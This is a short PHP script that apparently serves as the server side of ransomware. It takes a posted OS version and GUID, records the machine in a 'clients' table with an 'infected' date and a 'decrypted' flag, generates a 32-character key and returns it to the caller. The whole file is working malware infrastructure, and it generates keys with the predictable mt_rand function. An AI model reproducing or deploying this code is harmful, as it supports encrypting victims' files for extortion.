<?php

    /**
     * @author Tomáš Keske
     */

    require_once "db.php";

    function random_str($type = 'alphanum', $length = 8)
    {
        switch($type)
        {
            case 'basic'    : return mt_rand();
                break;
            case 'alpha'    :
            case 'alphanum' :
            case 'num'      :
            case 'nozero'   :
                    $seedings             = array();
                    $seedings['alpha']    = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
                    $seedings['alphanum'] = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
                    $seedings['num']      = '0123456789';
                    $seedings['nozero']   = '123456789';
                    
                    $pool = $seedings[$type];
                    
                    $str = '';
                    for ($i=0; $i < $length; $i++)
                    {
                        $str .= substr($pool, mt_rand(0, strlen($pool) -1), 1);
                    }
                    return $str;
                break;
            case 'unique'   :
            case 'md5'      :
                        return md5(uniqid(mt_rand()));
                break;
        }
    }

    if (isset($_POST["version"]) && isset($_POST["guid"])){

    	if (!($stmt = $link->prepare("SELECT * FROM clients WHERE guid = ?"))) {
         	echo "Prepare failed: (" . $link->errno . ") " . $link->error;
    	}

    	$stmt->bind_param("s", $_POST["guid"]);

    	$stmt->execute();

        $result = $stmt->get_result();

        $num = $result->num_rows;

        $stmt->close();

        if (!$num){

       		if (!($stmt = $link->prepare("INSERT INTO clients (os_version, guid, password, infected, decrypted) VALUES (?,?,?,?,?)"))) {
         		echo "Prepare failed: (" . $link->errno . ") " . $link->error;
    		}

    		$pass = random_str('alphanum', 32);
    		$decrypted = 0;
    		$date = date("F j, Y, g:i a");

    		$stmt->bind_param("ssssi", $_POST["version"], $_POST["guid"], $pass, $date, $decrypted);

    		$stmt->execute();

    		$stmt->close();

    		echo $pass;

        }
    }

?>